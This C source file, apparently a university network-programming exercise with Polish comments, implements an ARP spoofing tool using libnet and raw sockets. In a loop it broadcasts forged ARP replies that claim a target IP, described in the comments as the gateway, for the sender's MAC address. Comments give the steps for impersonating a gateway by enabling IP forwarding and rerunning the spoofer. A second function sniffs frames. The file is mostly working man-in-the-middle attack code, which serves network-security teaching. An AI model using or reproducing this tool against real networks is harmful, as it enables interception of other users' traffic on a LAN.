/*
//TODO
 * Compilation:  gcc -Wall ./arprep.c -o ./arprep -lnet
 * Usage:        ./arprep INTERFACE HOST
 * NOTE:         This program requires root privileges.
 *
 * Bug reports:  https://gitlab.cs.put.poznan.pl/mkalewski/ps-2018/issues
 *
 */

// podszycie się pod brame
// 1) echo 1 > /proc/sys/net/ipv4/ip_forward    // jako router
// 2) while true; do sudo ./arprep 150.254.32.129; sleep 2; done

// ustawianie adresu bramy recznie (nie bedzie nadpisywana), dziala tylko do restartu

// sudo arping -I br0 150.254.32.133

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

// #include <thread> 
// #include <chrono>

#include <libnet.h>

#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>



void* spoof(char* address){
  // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
  while(1){ // TODO obsługa na signal
    libnet_t *ln;
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr* src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    ln = libnet_init(LIBNET_LINK, NULL, errbuf);
    src_hw_addr = libnet_get_hwaddr(ln); // Returns the MAC address for the device libnet was initialized with
    target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE); // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address. 
                                                                    // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
    zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(
      ARPOP_REPLY,                     /* operation type       */
      src_hw_addr->ether_addr_octet,   /* sender hardware addr */ // nasz MAC
      (u_int8_t*) &target_ip_addr,     /* sender protocol addr */ // adres IP bramy
      zero_hw_addr,                    /* target hardware addr */ // dowolny MAC zapytał
      (u_int8_t*) &zero_ip_addr,       /* target protocol addr */ // -,,-
      ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
      bcast_hw_addr,                   /* ethernet destination */
      ETHERTYPE_ARP,                   /* ethertype            */
      ln);                             /* libnet context       */
    libnet_write(ln);
    libnet_destroy(ln);
    printf("Sent ARP\n");
    sleep(1);
    // std::chrono::seconds sec = std::chrono::seconds(2); 
    // std::this_thread::sleep_for(sec);
  }
}

void* capture(char* inteface_name){
  int sfd, i;
  ssize_t len;
  char* frame;
  char* fdata;
  struct ethhdr* fhead;
  struct ifreq ifr;
  struct sockaddr_ll sall;

  sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  strncpy(ifr.ifr_name, inteface_name, IFNAMSIZ);
  ioctl(sfd, SIOCGIFINDEX, &ifr);
  memset(&sall, 0, sizeof(struct sockaddr_ll));
  sall.sll_family = AF_PACKET;
  sall.sll_protocol = htons(ETH_P_ALL);
  sall.sll_ifindex = ifr.ifr_ifindex;
  sall.sll_hatype = ARPHRD_ETHER;
  sall.sll_pkttype = PACKET_HOST;
  sall.sll_halen = ETH_ALEN;
  bind(sfd, (struct sockaddr*) &sall, sizeof(struct sockaddr_ll));
  while(1) { // TODO zamknięcie na signal
    frame = malloc(ETH_FRAME_LEN);
    memset(frame, 0, ETH_FRAME_LEN);
    fhead = (struct ethhdr*) frame;
    fdata = frame + ETH_HLEN;
    len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
    printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int)len,
           fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
           fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
    printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
           fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
           fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
    //printf("%s\n", fdata);
    //for (i = 0; i < len ; i++) {
    //  printf("%02x ", (unsigned char) frame[i]);
    //  if ((i + 1) % 16 == 0)
    //    printf("\n");
    //}
    printf("\n\n");
    free(frame);
  }
  close(sfd);
}

int main(int argc, char** argv) {

  spoof(argv[2]);

  // pthread_t arp_spoofer;
  // pthread_create(&arp_spoofer, NULL, spoof, argv[2]);

  // pthread_t capturer;
  // pthread_create(&capturer, NULL, capture, argv[1]);

  // pthread_join(arp_spoofer, NULL);
  // pthread_join(capturer, NULL);
  
  //TODO obsługa wejścia - komunikat że brakuje argumentów itp.

  // std::thread arp_spoofer(spoof, argv[2]);
  // std::thread capturer(capture, argv[1]);

  // arp_spoofer.join();  
  // capturer.join();  

}
